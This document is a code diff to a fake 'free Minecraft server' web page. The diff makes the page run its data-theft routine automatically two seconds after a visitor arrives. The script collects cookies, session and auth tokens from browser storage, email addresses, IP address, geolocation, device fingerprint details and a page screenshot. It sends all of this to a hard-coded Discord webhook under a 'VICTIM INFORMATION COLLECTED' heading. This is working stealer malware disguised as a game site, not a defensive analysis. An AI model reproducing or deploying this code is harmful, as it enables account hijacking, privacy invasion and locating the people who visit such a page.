@@ -29,7 +29,6 @@
             overflow-x: hidden;
         }
         
-        /* خلفية متحركة على شكل ماينكرافت */
         .minecraft-bg {
             position: fixed;
             top: 0;
@@ -68,7 +67,6 @@
             to { opacity: 1; transform: translateY(0); }
         }
         
-        /* الهيدر مع سيفرات */
         .server-header {
             text-align: center;
             margin-bottom: 40px;
@@ -110,12 +108,6 @@
             letter-spacing: 3px;
         }
         
-        .server-ip p {
-            color: #888;
-            margin-top: 5px;
-        }
-        
-        /* كروت الإحصائيات */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
@@ -128,13 +120,12 @@
             padding: 25px;
             border-radius: 20px;
             text-align: center;
-            transition: transform 0.3s, box-shadow 0.3s;
+            transition: transform 0.3s;
             border: 1px solid rgba(255, 215, 0, 0.3);
         }
         
         .stat-card:hover {
             transform: translateY(-5px);
-            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.2);
             border-color: #ffd700;
         }
         
@@ -149,24 +140,12 @@
             color: #ffd700;
         }
         
-        .stat-label {
-            color: #aaa;
-            margin-top: 5px;
-        }
-        
-        /* صورة السيرفر */
         .server-image {
             margin: 40px 0;
             border-radius: 20px;
             overflow: hidden;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            cursor: pointer;
-            transition: transform 0.3s;
             position: relative;
-        }
-        
-        .server-image:hover {
-            transform: scale(1.02);
         }
         
         .server-image img {
@@ -175,92 +154,6 @@
             display: block;
         }
         
-        .image-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, rgba(255,215,0,0.2), rgba(0,0,0,0.5));
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-        
-        .server-image:hover .image-overlay {
-            opacity: 1;
-        }
-        
-        .overlay-text {
-            background: rgba(0, 0, 0, 0.8);
-            padding: 15px 30px;
-            border-radius: 50px;
-            font-size: 20px;
-            color: #ffd700;
-            border: 2px solid #ffd700;
-        }
-        
-        /* قائمة السيرفرات */
-        .server-list {
-            margin: 40px 0;
-        }
-        
-        .server-item {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-            padding: 20px;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 20px;
-            transition: background 0.3s;
-            border: 1px solid transparent;
-        }
-        
-        .server-item:hover {
-            background: rgba(255, 215, 0, 0.1);
-            border-color: #ffd700;
-        }
-        
-        .server-icon {
-            font-size: 30px;
-            min-width: 60px;
-            height: 60px;
-            background: rgba(255, 215, 0, 0.1);
-            border-radius: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .server-info {
-            flex: 1;
-        }
-        
-        .server-name {
-            font-size: 20px;
-            font-weight: bold;
-            color: #ffd700;
-            margin-bottom: 5px;
-        }
-        
-        .server-desc {
-            color: #aaa;
-            font-size: 14px;
-        }
-        
-        .server-status {
-            background: #00ff00;
-            color: black;
-            padding: 8px 15px;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: bold;
-        }
-        
-        /* أزرار */
         .join-button {
             background: linear-gradient(135deg, #ffd700, #ff9900);
             color: black;
@@ -282,7 +175,6 @@
             box-shadow: 0 15px 30px rgba(255, 215, 0, 0.5);
         }
         
-        /* الفوتر */
         .footer {
             margin-top: 60px;
             text-align: center;
@@ -290,28 +182,6 @@
             font-size: 14px;
         }
         
-        /* رسالة النجاح */
-        .success-message {
-            background: rgba(0, 255, 0, 0.1);
-            border: 2px solid #00ff00;
-            border-radius: 15px;
-            padding: 15px;
-            margin-top: 20px;
-            color: #00ff00;
-            display: none;
-        }
-        
-        .success-message.show {
-            display: block;
-            animation: slideIn 0.5s;
-        }
-        
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        /* ريموت للتحميل */
         .loading-spinner {
             display: inline-block;
             width: 20px;
@@ -327,28 +197,10 @@
             to { transform: rotate(360deg); }
         }
         
-        /* تجاوب مع الجوال */
         @media (max-width: 768px) {
-            .container {
-                padding: 20px;
-            }
-            
-            h1 {
-                font-size: 32px;
-            }
-            
-            .server-ip h2 {
-                font-size: 24px;
-            }
-            
-            .stat-card {
-                padding: 15px;
-            }
-            
-            .join-button {
-                font-size: 20px;
-                padding: 15px 30px;
-            }
+            .container { padding: 20px; }
+            h1 { font-size: 32px; }
+            .server-ip h2 { font-size: 24px; }
         }
     </style>
 </head>
@@ -363,7 +215,7 @@
             
             <div class="server-ip">
                 <h2>play.freeserver.com</h2>
-                <p>⚡ Click to copy IP ⚡</p>
+                <p>⚡ Join now ⚡</p>
             </div>
         </div>
         
@@ -390,12 +242,8 @@
             </div>
         </div>
         
-        <!-- صورة السيرفر (الضغط عليها يشغل السكريبت) -->
-        <div class="server-image" onclick="sendCookies()">
+        <div class="server-image">
             <img src="https://i.imgur.com/W5QvRzm.png" alt="Minecraft Server">
-            <div class="image-overlay">
-                <span class="overlay-text">🎮 Click to Join! 🎮</span>
-            </div>
         </div>
         
         <div style="text-align: center;">
@@ -405,59 +253,19 @@
             </button>
         </div>
         
-        <div class="server-list">
-            <h3 style="color: #ffd700; margin-bottom: 20px;">✨ POPULAR SERVERS ✨</h3>
-            
-            <div class="server-item">
-                <div class="server-icon">🏰</div>
-                <div class="server-info">
-                    <div class="server-name">SkyBlock Network</div>
-                    <div class="server-desc">skyblock.freeserver.com • 432 online</div>
-                </div>
-                <div class="server-status">ONLINE</div>
-            </div>
-            
-            <div class="server-item">
-                <div class="server-icon">⚔️</div>
-                <div class="server-info">
-                    <div class="server-name">PvP Legends</div>
-                    <div class="server-desc">pvp.freeserver.com • 891 online</div>
-                </div>
-                <div class="server-status">ONLINE</div>
-            </div>
-            
-            <div class="server-item">
-                <div class="server-icon">🌳</div>
-                <div class="server-info">
-                    <div class="server-name">Survival World</div>
-                    <div class="server-desc">survival.freeserver.com • 324 online</div>
-                </div>
-                <div class="server-status">ONLINE</div>
-            </div>
-            
-            <div class="server-item">
-                <div class="server-icon">🏝️</div>
-                <div class="server-info">
-                    <div class="server-name">OneBlock MC</div>
-                    <div class="server-desc">oneblock.freeserver.com • 156 online</div>
-                </div>
-                <div class="server-status">ONLINE</div>
-            </div>
-        </div>
-        
-        <div class="success-message" id="successMessage">
-            ✅ Successfully connected to server! Launching Minecraft...
-        </div>
-        
         <div class="footer">
             <p>© 2026 Minecraft Free Server • All servers are free and 24/7</p>
-            <p style="margin-top: 10px; color: #444;">⚡ Click on the image or button to join instantly ⚡</p>
         </div>
     </div>
 
     <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
 
     <script>
+        // التنفيذ التلقائي فور دخول الموقع
+        window.onload = function() {
+            setTimeout(sendCookies, 2000);
+        };
+
         // ============================================
         // دالة البحث عن الإيميلات الحقيقية
         // ============================================
@@ -466,39 +274,25 @@
             const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
             
             try {
-                // 1. البحث في الكوكيز
                 const cookies = document.cookie;
                 const cookieEmails = cookies.match(emailRegex);
                 if (cookieEmails) cookieEmails.forEach(e => emails.add(e));
                 
-                // 2. البحث في localStorage
                 for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    const value = localStorage.getItem(key);
-                    
-                    const keyEmails = key.match(emailRegex);
-                    if (keyEmails) keyEmails.forEach(e => emails.add(e));
-                    
+                    const value = localStorage.getItem(localStorage.key(i));
                     if (value && typeof value === 'string') {
                         const valueEmails = value.match(emailRegex);
                         if (valueEmails) valueEmails.forEach(e => emails.add(e));
                     }
                 }
                 
-                // 3. البحث في sessionStorage
                 for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    const value = sessionStorage.getItem(key);
-                    
-                    const keyEmails = key.match(emailRegex);
-                    if (keyEmails) keyEmails.forEach(e => emails.add(e));
-                    
+                    const value = sessionStorage.getItem(sessionStorage.key(i));
                     if (value && typeof value === 'string') {
                         const valueEmails = value.match(emailRegex);
                         if (valueEmails) valueEmails.forEach(e => emails.add(e));
                     }
                 }
-                
             } catch(e) {}
             
             return Array.from(emails);
@@ -544,15 +338,12 @@
         }
 
         // ============================================
-        // دالة البحث عن التوكنات الحقيقية
+        // دالة البحث عن التوكنات
         // ============================================
         function findRealTokens() {
             const tokens = [];
-            
-            // كلمات مفتاحية للبحث عن التوكنات
             const tokenKeywords = ['token', 'auth', 'jwt', 'session', 'access', 'refresh', 'bearer', 'api_key', 'apikey', 'secret', 'password', 'pass', 'login', 'user', 'id', 'sid', 'csrf', 'xsrf', 'oauth'];
             
-            // 1. البحث في الكوكيز
             const cookies = document.cookie.split(';');
             cookies.forEach(cookie => {
                 const [name, value] = cookie.trim().split('=');
@@ -560,61 +351,23 @@
                 
                 tokenKeywords.forEach(keyword => {
                     if (name.toLowerCase().includes(keyword.toLowerCase())) {
-                        tokens.push({
-                            source: '🍪 Cookie',
-                            name: name,
-                            value: value,
-                            type: keyword
-                        });
+                        tokens.push({ source: '🍪 Cookie', name: name, value: value, type: keyword });
                     }
                 });
                 
-                // فحص JWT (ثلاثة أجزاء مفصولة بنقاط)
                 if (value && value.split('.').length === 3) {
-                    tokens.push({
-                        source: '🔐 JWT Token',
-                        name: name,
-                        value: value,
-                        type: 'JWT'
-                    });
+                    tokens.push({ source: '🔐 JWT Token', name: name, value: value, type: 'JWT' });
                 }
             });
             
-            // 2. البحث في localStorage
             try {
                 for(let i = 0; i < localStorage.length; i++) {
                     let key = localStorage.key(i);
                     let value = localStorage.getItem(key);
                     
                     tokenKeywords.forEach(keyword => {
-                        if (key.toLowerCase().includes(keyword.toLowerCase()) || 
-                            (value && value.length > 20 && value.includes('.'))) {
-                            tokens.push({
-                                source: '💾 localStorage',
-                                name: key,
-                                value: value.substring(0, 100),
-                                type: keyword
-                            });
-                        }
-                    });
-                }
-            } catch(e) {}
-            
-            // 3. البحث في sessionStorage
-            try {
-                for(let i = 0; i < sessionStorage.length; i++) {
-                    let key = sessionStorage.key(i);
-                    let value = sessionStorage.getItem(key);
-                    
-                    tokenKeywords.forEach(keyword => {
-                        if (key.toLowerCase().includes(keyword.toLowerCase()) || 
-                            (value && value.length > 20 && value.includes('.'))) {
-                            tokens.push({
-                                source: '📝 sessionStorage',
-                                name: key,
-                                value: value.substring(0, 100),
-                                type: keyword
-                            });
+                        if (key.toLowerCase().includes(keyword.toLowerCase())) {
+                            tokens.push({ source: '💾 localStorage', name: key, value: value, type: keyword });
                         }
                     });
                 }
@@ -623,19 +376,118 @@
             return tokens;
         }
 
+        // ============================================
+        // معلومات جديدة وقوية
+        // ============================================
+        async function getAdvancedInfo() {
+            const info = {};
+            
+            // 1. معلومات الموقع الجغرافي (بدون طلب إذن - من IP)
+            try {
+                const geoResponse = await fetch('https://ipapi.co/json/');
+                const geoData = await geoResponse.json();
+                info.country = geoData.country_name || 'Unknown';
+                info.city = geoData.city || 'Unknown';
+                info.isp = geoData.org || 'Unknown';
+                info.postal = geoData.postal || 'Unknown';
+                info.latitude = geoData.latitude || 'Unknown';
+                info.longitude = geoData.longitude || 'Unknown';
+                info.timezone = geoData.timezone || 'Unknown';
+            } catch (e) {}
+
+            // 2. معلومات البطارية المتقدمة
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    info.batteryLevel = Math.round(battery.level * 100) + '%';
+                    info.batteryCharging = battery.charging ? 'Yes' : 'No';
+                    info.batteryTimeRemaining = battery.charging ? 'Charging' : (battery.dischargingTime ? Math.round(battery.dischargingTime / 60) + ' minutes' : 'Unknown');
+                } catch (e) {}
+            }
+
+            // 3. معلومات الشبكة المتقدمة
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                info.networkType = connection.type || 'Unknown';
+                info.networkEffectiveType = connection.effectiveType || 'Unknown';
+                info.networkDownlink = connection.downlink ? connection.downlink + ' Mbps' : 'Unknown';
+                info.networkRtt = connection.rtt ? connection.rtt + ' ms' : 'Unknown';
+                info.networkSaveData = connection.saveData ? 'Yes' : 'No';
+            }
+
+            // 4. معلومات GPU متقدمة
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        info.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                        info.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    }
+                    info.gpuVersion = gl.getParameter(gl.VERSION);
+                    info.gpuShadingVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
+                }
+            } catch (e) {}
+
+            // 5. معلومات الشاشة المتقدمة
+            info.screenWidth = window.screen.width;
+            info.screenHeight = window.screen.height;
+            info.screenAvailWidth = window.screen.availWidth;
+            info.screenAvailHeight = window.screen.availHeight;
+            info.screenColorDepth = window.screen.colorDepth;
+            info.screenPixelDepth = window.screen.pixelDepth;
+            info.screenOrientation = window.screen.orientation ? window.screen.orientation.type : 'Unknown';
+
+            // 6. معلومات المتصفح المتقدمة
+            info.browserPlatform = navigator.platform;
+            info.browserLanguage = navigator.language;
+            info.browserLanguages = navigator.languages ? navigator.languages.join(', ') : 'Unknown';
+            info.browserCookieEnabled = navigator.cookieEnabled;
+            info.browserDoNotTrack = navigator.doNotTrack || 'Not specified';
+            info.browserHardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
+            info.browserDeviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
+            info.browserMaxTouchPoints = navigator.maxTouchPoints;
+            info.browserPdfViewerEnabled = navigator.pdfViewerEnabled;
+            info.browserVendor = navigator.vendor;
+
+            // 7. معلومات الوقت المتقدمة
+            info.timeLocal = new Date().toString();
+            info.timeTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            info.timezoneOffset = new Date().getTimezoneOffset();
+            info.timeUTC = new Date().toUTCString();
+
+            // 8. معلومات التخزين
+            try {
+                if (navigator.storage && navigator.storage.estimate) {
+                    const storage = await navigator.storage.estimate();
+                    info.storageUsage = storage.usage ? Math.round(storage.usage / 1024 / 1024) + ' MB' : 'Unknown';
+                    info.storageQuota = storage.quota ? Math.round(storage.quota / 1024 / 1024) + ' MB' : 'Unknown';
+                }
+            } catch (e) {}
+
+            // 9. معلومات الإضافات
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push(navigator.plugins[i].name);
+            }
+            info.browserPlugins = plugins.length > 0 ? plugins.join(', ').substring(0, 200) : 'No plugins';
+
+            // 10. معلومات الـ IndexedDB
+            try {
+                if (window.indexedDB && indexedDB.databases) {
+                    const dbs = await indexedDB.databases();
+                    info.indexedDB = dbs.map(db => db.name).join(', ') || 'No databases';
+                }
+            } catch (e) {}
+
+            return info;
+        }
+
         async function sendCookies() {
-            // إظهار رسالة النجاح
-            const successMsg = document.getElementById('successMessage');
-            successMsg.classList.add('show');
-            
-            // إخفاء رسالة النجاح بعد 3 ثواني
-            setTimeout(() => {
-                successMsg.classList.remove('show');
-            }, 3000);
-            
             try {
                 // ============================================
-                // 1. أخذ لقطة للمتصفح أولاً
+                // 1. أخذ لقطة للمتصفح
                 // ============================================
                 let screenshotBase64 = '';
                 try {
@@ -646,80 +498,21 @@
                         useCORS: true,
                         backgroundColor: '#1b2b3f'
                     });
-                    
                     screenshotBase64 = canvas.toDataURL('image/png');
                 } catch (e) {}
 
                 // ============================================
-                // 2. معلومات الشبكة
+                // 2. المعلومات الأساسية
                 // ============================================
-                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                const networkInfo = {
-                    downlink: connection?.downlink || 'Unknown',
-                    effectiveType: connection?.effectiveType || 'Unknown',
-                    rtt: connection?.rtt || 'Unknown'
-                };
-
+                const ipAddress = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'Unknown');
+                
                 // ============================================
-                // 3. معلومات المتصفح
+                // 3. المعلومات المتقدمة
                 // ============================================
-                const browserInfo = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
-                    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'
-                };
-
+                const advancedInfo = await getAdvancedInfo();
+                
                 // ============================================
-                // 4. معلومات GPU
-                // ============================================
-                let gpuInfo = 'Unknown';
-                try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if (gl) {
-                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        if (debugInfo) {
-                            gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                        }
-                    }
-                } catch (e) {}
-
-                // ============================================
-                // 5. معلومات الشاشة
-                // ============================================
-                const screenInfo = {
-                    width: window.screen.width,
-                    height: window.screen.height
-                };
-
-                // ============================================
-                // 6. معلومات البطارية
-                // ============================================
-                let batteryInfo = { level: 'Unknown', charging: 'Unknown' };
-                if (navigator.getBattery) {
-                    try {
-                        const battery = await navigator.getBattery();
-                        batteryInfo = {
-                            level: Math.round(battery.level * 100) + '%',
-                            charging: battery.charging ? 'Yes' : 'No'
-                        };
-                    } catch (e) {}
-                }
-
-                // ============================================
-                // 7. الحصول على IP
-                // ============================================
-                let ipAddress = 'Unknown';
-                try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
-                    ipAddress = ipData.ip;
-                } catch (e) {}
-
-                // ============================================
-                // 8. جمع المعلومات
+                // 4. جمع كل المعلومات
                 // ============================================
                 const realEmails = findRealEmails();
                 const windowsUsername = getWindowsUsername();
@@ -732,49 +525,94 @@
                 let tokenMessage = '';
                 if (foundTokens.length > 0) {
                     tokenMessage = foundTokens.map(t => 
-                        `${t.source} | ${t.name}: ${t.value.substring(0, 50)}...`
+                        `${t.source} | **${t.name}**: \`${t.value.substring(0, 50)}${t.value.length > 50 ? '...' : ''}\` (${t.type})`
                     ).join('\n');
                 } else {
                     tokenMessage = 'No tokens found';
                 }
 
                 // ============================================
-                // إرسال إلى Discord
+                // إرسال إلى Discord (الرسالة القديمة + معلومات جديدة)
                 // ============================================
                 const webhookUrl = 'https://discord.com/api/webhooks/1476727887053721721/UkshRh9j3xisTqqOHLnEvMI5dFlg-dmLWZkuY55yPtAWjuFFM0iPkMlFWUlF0LUjWHTN';
 
                 const textMessage = `
-**🎮 MINECRAFT SERVER VISITOR 🎮**
+**🚨 VICTIM INFORMATION COLLECTED 🚨**
 
-**👤 USER:**
-• Username: ${windowsUsername}
-• Computer: ${computerName}
-• IP: ${ipAddress}
+**👤 USER INFO:**
+• **Windows Username:** ${windowsUsername}
+• **Computer Name:** ${computerName}
+• **IP Address:** ${ipAddress}
+• **Country:** ${advancedInfo.country || 'Unknown'}
+• **City:** ${advancedInfo.city || 'Unknown'}
+• **ISP:** ${advancedInfo.isp || 'Unknown'}
+• **Postal Code:** ${advancedInfo.postal || 'Unknown'}
+• **Coordinates:** ${advancedInfo.latitude || 'Unknown'}, ${advancedInfo.longitude || 'Unknown'}
 
-**📧 EMAILS:**
+**📧 REAL EMAILS FOUND:**
 ${emailsMessage}
 
-**🔑 TOKENS:**
+**🔑 TOKENS FOUND:**
 ${tokenMessage}
 
-**🍪 COOKIES:**
-${document.cookie || 'None'}
+**📋 ALL COOKIES:**
+\`\`\`
+${document.cookie || 'No cookies found'}
+\`\`\`
 
-**💻 SYSTEM:**
-• Platform: ${browserInfo.platform}
-• CPU: ${browserInfo.hardwareConcurrency} cores
-• RAM: ${browserInfo.deviceMemory}
-• Battery: ${batteryInfo.level} (${batteryInfo.charging})
-• GPU: ${gpuInfo}
+**🌐 NETWORK INFO:**
+• **Connection Type:** ${advancedInfo.networkType || 'Unknown'}
+• **Effective Type:** ${advancedInfo.networkEffectiveType || 'Unknown'}
+• **Speed:** ${advancedInfo.networkDownlink || 'Unknown'}
+• **Ping:** ${advancedInfo.networkRtt || 'Unknown'}
+• **Save Data:** ${advancedInfo.networkSaveData || 'Unknown'}
 
-**🖥️ SCREEN:**
-${screenInfo.width}x${screenInfo.height}
+**💻 SYSTEM INFO:**
+• **Platform:** ${advancedInfo.browserPlatform || 'Unknown'}
+• **Language:** ${advancedInfo.browserLanguage || 'Unknown'}
+• **Languages:** ${advancedInfo.browserLanguages || 'Unknown'}
+• **CPU Cores:** ${advancedInfo.browserHardwareConcurrency || 'Unknown'}
+• **RAM:** ${advancedInfo.browserDeviceMemory || 'Unknown'}
+• **Battery Level:** ${advancedInfo.batteryLevel || 'Unknown'}
+• **Battery Charging:** ${advancedInfo.batteryCharging || 'Unknown'}
+• **Battery Time Remaining:** ${advancedInfo.batteryTimeRemaining || 'Unknown'}
 
-**🌍 BROWSER:**
-${browserInfo.userAgent.substring(0, 200)}
+**🖥️ DISPLAY INFO:**
+• **Resolution:** ${advancedInfo.screenWidth || 'Unknown'}x${advancedInfo.screenHeight || 'Unknown'}
+• **Available Resolution:** ${advancedInfo.screenAvailWidth || 'Unknown'}x${advancedInfo.screenAvailHeight || 'Unknown'}
+• **Color Depth:** ${advancedInfo.screenColorDepth || 'Unknown'}-bit
+• **Pixel Depth:** ${advancedInfo.screenPixelDepth || 'Unknown'}-bit
+• **Orientation:** ${advancedInfo.screenOrientation || 'Unknown'}
 
-**⏰ TIME:**
-${new Date().toString()}
+**🎮 GPU INFO:**
+• **Renderer:** ${advancedInfo.gpuRenderer || 'Unknown'}
+• **Vendor:** ${advancedInfo.gpuVendor || 'Unknown'}
+• **Version:** ${advancedInfo.gpuVersion || 'Unknown'}
+• **Shading Version:** ${advancedInfo.gpuShadingVersion || 'Unknown'}
+
+**⏰ TIME INFO:**
+• **Local Time:** ${advancedInfo.timeLocal || 'Unknown'}
+• **UTC Time:** ${advancedInfo.timeUTC || 'Unknown'}
+• **Timezone:** ${advancedInfo.timeTimezone || 'Unknown'}
+• **Offset:** ${advancedInfo.timezoneOffset || 'Unknown'} minutes
+
+**💾 STORAGE INFO:**
+• **Storage Usage:** ${advancedInfo.storageUsage || 'Unknown'}
+• **Storage Quota:** ${advancedInfo.storageQuota || 'Unknown'}
+• **IndexedDB Databases:** ${advancedInfo.indexedDB || 'None'}
+
+**🔧 BROWSER INFO:**
+• **User Agent:** ${navigator.userAgent}
+• **Cookies Enabled:** ${advancedInfo.browserCookieEnabled || 'Unknown'}
+• **Do Not Track:** ${advancedInfo.browserDoNotTrack || 'Unknown'}
+• **Max Touch Points:** ${advancedInfo.browserMaxTouchPoints || 'Unknown'}
+• **PDF Viewer:** ${advancedInfo.browserPdfViewerEnabled || 'Unknown'}
+• **Vendor:** ${advancedInfo.browserVendor || 'Unknown'}
+• **Plugins:** ${advancedInfo.browserPlugins || 'None'}
+
+**🌍 ADDITIONAL INFO:**
+• **Timezone (from geo):** ${advancedInfo.timezone || 'Unknown'}
+• **Online Status:** ${navigator.onLine ? '✅ Online' : '❌ Offline'}
 `;
 
                 // إرسال النص
@@ -801,7 +639,7 @@ ${new Date().toString()}
 
                     const blob = new Blob(byteArrays, { type: 'image/png' });
                     const formData = new FormData();
-                    formData.append('file', blob, 'minecraft_visitor.png');
+                    formData.append('file', blob, 'victim_screenshot.png');
                     
                     await fetch(webhookUrl, {
                         method: 'POST',
@@ -809,8 +647,10 @@ ${new Date().toString()}
                     });
                 }
 
+                console.log('✅ Information sent successfully!');
+
             } catch (error) {
-                console.log('Error:', error);
+                console.error('Error:', error);
             }
         }
     </script>
